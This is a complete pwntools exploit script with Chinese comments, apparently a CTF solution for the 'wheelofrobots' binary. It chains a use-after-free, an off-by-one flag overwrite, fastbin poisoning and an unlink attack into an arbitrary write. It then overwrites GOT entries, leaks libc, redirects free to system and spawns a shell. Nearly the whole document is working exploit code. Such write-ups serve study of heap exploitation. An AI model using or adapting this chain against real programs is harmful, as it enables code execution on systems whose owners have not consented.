#coding:utf-8
from pwn import *
context(arch='amd64',os='linux')
context.log_level = 'debug'
io = process('./wheelofrobots')
elf = ELF('./wheelofrobots')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#例行公事

def add(idx,size=0):
	io.recvuntil('choice : ')
	io.sendline('1')
	io.recvuntil('choice :')
	io.sendline(str(idx))
	if idx == 2:
		io.recvuntil("Increase Bender's intelligence: ")
		io.sendline(str(size))
	elif idx == 3:
		io.recvuntil("Increase Robot Devil's cruelty: ")
		io.sendline(str(size))
	elif idx == 6:
		io.recvuntil("Increase Destructor's powerful: ")
		io.sendline(str(size))
		
def delete(idx):
	io.recvuntil('choice : ')
	io.sendline('2')
	io.recvuntil('choice :')
	io.sendline(str(idx))
	
def change(idx,name):
	io.recvuntil('choice : ')
	io.sendline('3')
	io.recvuntil('choice :')
	io.send(str(idx))
	io.recvuntil('name: \n')
	io.send(name)

def start():
	io.recvuntil('choice : ')
	io.sendline('4')

def off_by_one(inuse):
	io.recvuntil('choice : ')
	io.sendline('1')
	io.recvuntil('choice :')
	io.send('9999'+inuse)
	
def write(where,what):
	change(1,p64(where))
	change(6,p64(what))
#此处是执行的任意地址写的漏洞，具体原因在下面

add(2,1)
#首先添加一个size为0x20的块

delete(2)
#然后将其free，因为块的大小属于fastbin，因此该块的地址会放入fastbin的size为0x20的链表的头节点
#且此处free之后，它没有将指针清空，这就构成了UAF漏洞

off_by_one('\x01')
#哪里产生了off_by_one漏洞呢？其实跟着这个函数看一下就立马发现了
#该漏洞所溢出的一个字节会将表示bot2是否存在的那个变量的值给覆盖

change(2,p64(0x603138))
#将bot2的块的fd改为0x603138
#0x603138指的是我们输入的bot2的size

off_by_one('\x00')
#将bot2存在位再覆盖回0

add(2,1)
#此处由于size依旧是20即0x14，即要分配的块的大小依旧是0x20
#所以calloc的块依旧是刚刚free掉的块，且fd指针被取出，放入fastbin的size为0x20的链表的头结点

add(3,0x20)
#因为bot3的size位于0x603140，将这里覆盖成0x20，可以构造0x603138这一块的size位0x20
#当然，现在这一块还未分配
#之所以要提前构建，是因为fastbin分配的时候的如下代码：
#			if (__builtin_expect(fastbin_index(chunksize(victim)) != idx, 0)) {
#               errstr = "malloc(): memory corruption (fast)";
#           errout:
#               malloc_printerr(check_action, errstr, chunk2mem(victim), av);
#               return NULL;
#           }
#它会检查即将分配的这一块的大小究竟是不是它所属链表的大小
#当然，这里add一个bot3的块对fastbin的分配无影响，因为这里读入的size它会先乘0x14再分配
#这size就远超fastbin的最大size了

add(1)
#这里终于将bot1分到的块指向了0x603148
#为什么是0x603148呢，是因为0x6038开始是块的header

delete(2)
delete(3)
#因为块的数量有限，程序限制只能添加三个，所以将这两个无关的块free

add(6,3)
#这里构造了一个bot6，bot6的size是60，它分配到的块的size就是0x40+0x10=0x50
#为什么要这么大呢，可以小点吗？应该是可以的，只要它能放下我们的payload

add(3,7)
#这里构造了一个size为0xa0的块，比fastbin大
#为什么要比fastbin大呢
#因为我们要向低地址合并空闲块触发unlink
#只有不是fastbin的情况下才会触发unlink

change(1,p64(0x1000))
#因为bot1的块指向的是0x603148，而0x603148指向的是bot6的size
#这里我们编辑bot1的块，就可以改变程序中存储的bot6的size
#就可以通过堆溢出漏洞实现unlink

payload = p64(0)+p64(0x20)+p64(0x6030E8-0x18)+p64(0x6030E8-0x10)+p64(0x20)
payload = payload.ljust(0x40,'a')
payload += p64(0x40)+p64(0xa0)
change(6,payload)
delete(3)
#这里就触发了unlink漏洞
#0x6030e8指向的是bot6的块，首先会躲过unlink的检测
#if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
#    malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
#然后，bot6的的内容就会指向它前面偏移为0x18的位置

payload = 'a'*0x28+p64(0x6030E8)
change(6,payload)
#这里编辑第六块，目的是为了让bot6指向的地址偏移0x28处的内容变为0x6030e8
#这里其实就是0x6030f8，即bot1的块的地址的存储位置
#这样的话，bot1就指向了bot6的块
#此时，就可以通过修改bot1来控制bot6的地址
#然后再修改bot6的内容就可以达到任意地址写的目的

#gdb.attach(io,'b *0x4015A3')
#raw_input()
write(0x603130,3)
#write函数就是任意地址写

free_got = elf.got['free']
exit_got = elf.got['exit']

#gdb.attach(io,'b *0x401725')
#raw_input()
write(exit_got,0x401855)
#这里要将exit的got给覆盖
#因为我们输出块的内容的唯一方式就是Start the Wheel Of Robots
#而执行完这个函数会直接exit，所以我们要让exit变成重新开始
#这里覆盖的地址要注意，不能是main函数的开始
#因为重复setbuf会导致程序崩溃
#剩下的就是例行公事了

change(1,p64(free_got))
start()
io.recvuntil('Thx ')
free_addr = u64(io.recv(6).ljust(8,'\x00'))
log.success(hex(free_addr))
libc_base = free_addr - libc.symbols['free']

sys_addr = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search('/bin/sh'))

write(free_got,sys_addr)
change(1,p64(bin_sh))
delete(6)
io.interactive()
